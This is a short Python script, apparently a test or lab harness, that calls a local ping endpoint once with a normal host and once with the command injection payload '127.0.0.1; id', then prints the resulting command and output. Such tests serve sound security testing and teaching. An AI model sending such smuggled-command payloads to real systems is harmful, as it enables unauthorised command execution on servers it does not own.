import requests

BASE_URL = "http://127.0.0.1:8000/ping"


def test_normal_ping():
    response = requests.get(
        BASE_URL,
        params={"host": "127.0.0.1"},
        timeout=5,
    )

    print("[+] Normal ping")
    print(f"Status: {response.status_code}")

    data = response.json()

    print(f"Command: {data['command']}")


def test_command_injection():
    payload = "127.0.0.1; id"

    response = requests.get(
        BASE_URL,
        params={"host": payload},
        timeout=5,
    )

    data = response.json()

    print("\n[+] Command Injection")
    print(f"Payload: {payload}")
    print(f"Command: {data['command']}")
    print(f"Output:\n{data['output']}")


if __name__ == "__main__":
    test_normal_ping()
    test_command_injection()
